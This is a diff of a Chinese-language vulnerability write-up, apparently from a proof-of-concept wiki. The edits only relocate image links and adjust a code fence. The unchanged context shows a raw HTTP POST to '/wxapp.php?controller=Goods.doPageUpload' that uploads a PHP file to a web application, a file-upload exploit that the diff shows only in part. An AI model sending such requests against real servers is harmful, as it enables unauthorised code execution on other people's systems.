@@ -20,11 +20,11 @@
 
 登录页面如下
 
-![](images/202202170927506.png)
+![](../.gitbook/assets/202202170927506.png)
 
 发送请求包上传PHP文件
 
-```plain
+```
 POST /wxapp.php?controller=Goods.doPageUpload HTTP/1.1
 Host: 
 Content-Length: 210
@@ -46,8 +46,6 @@ Content-Type: http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif
 ------WebKitFormBoundary8UaANmWAgM4BqBSs--
 ```
 
-![](images/202202170927684.png)
+![](../.gitbook/assets/202202170927684.png)
 
-
-
-![](images/202202170927948.png)
+![](../.gitbook/assets/202202170927948.png)
